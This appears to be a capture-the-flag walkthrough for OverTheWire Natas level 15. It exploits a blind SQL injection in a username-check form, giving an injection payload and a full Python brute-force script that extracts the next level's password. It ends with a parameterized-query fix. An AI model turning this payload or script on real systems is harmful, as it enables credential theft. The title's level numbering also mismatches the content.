# Natas Level 14 → Level 15

**Goal:** Find the password for natas16. This level is vulnerable to `blind SQL injection`, the query result isn’t shown directly, but the page’s response (true/false message) leaks enough information to extract data one character at a time.

###Step 1: Access the level

http://natas15.natas.labs.overthewire.org

Username: natas15
Password: (from previous level)

### Step 2: Read the page

The page has a form that checks if a given username exists, and simply says “This user exists” or “This user doesn’t exist” no actual data or password is shown directly.

### Step 3: View the PHP source code

Go to:

http://natas15.natas.labs.overthewire.org/index-source.html

You’ll see logic like:

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    $res = mysql_query($query, $link);
    if ($res) {
        if (mysql_num_rows($res) > 0) {
            echo "This user exists.<br>";
        } else {
            echo "This user doesn't exist.<br>";
        }
    } else {
        echo "Error in query.<br>";
    }
}
?>
```

Key points:

- Same injection point as Level 14 (unsanitized `username` in the query).
- But this time, there’s `no direct password output` only a binary “exists” / “doesn’t exist” response.
- This is a `blind SQLi`: we can’t see data directly, but we can ask yes/no questions and infer the answer from which message appears.

### Step 4: Understand the target

The `natas16` password is stored in a `users` table, in a `password` column, for the row where `username='natas16'`. We need to extract it character by character using conditional SQL injection.

### Step 5: Craft a boolean-based blind SQLi payload

General technique: inject a condition that’s true only if a specific character at a specific position matches a guess, using `SUBSTRING()`:

```sql
" AND password LIKE BINARY "a%

Full payload idea (injected into the username field):

" AND (SELECT password FROM users WHERE username="natas16") LIKE BINARY "a%
```

This asks: “Does natas16’s password start with the character `a`?” If “This user exists” is returned, the guess is correct (or at least matches); if not, try the next character.

### Step 6: Automate the extraction with a script

Doing this manually (26 letters × up to 32 positions) is tedious, automate it with a Python script:

```python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "<password_from_level14>")
charset = string.ascii_letters + string.digits

found_password = ""

for position in range(1, 33):  # natas passwords are typically 32 chars
    found_char = None
    for char in charset:
        payload = f'" AND (SELECT password FROM users WHERE username="natas16") LIKE BINARY "{found_password}{char}%'
        r = requests.get(url, auth=auth, params={"username": payload})
        if "This user exists" in r.text:
            found_char = char
            found_password += char
            print(f"Found so far: {found_password}")
            break
    if not found_char:
        break  # no more characters match, password is complete

print("Final password:", found_password)
```

### Step 7: Run the script

Execute it (needs the `requests` library: `pip install requests`):

```bash
python3 extract_password.py
```

It will print the password being built character by character, ending with the full 32-character password.

### Step 8: Get the password
Final password: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

*Lesson learned*

Even when an application doesn’t directly display query results or error messages, `any observable difference in behavior` (different page text, response time, HTTP status) based on injected conditions can be exploited to extract data via blind SQL injection just more slowly, character by character. The only real `fix remains` the same: use parameterized queries/prepared statements, never build SQL from raw user input, regardless of how little the application appears to “leak.”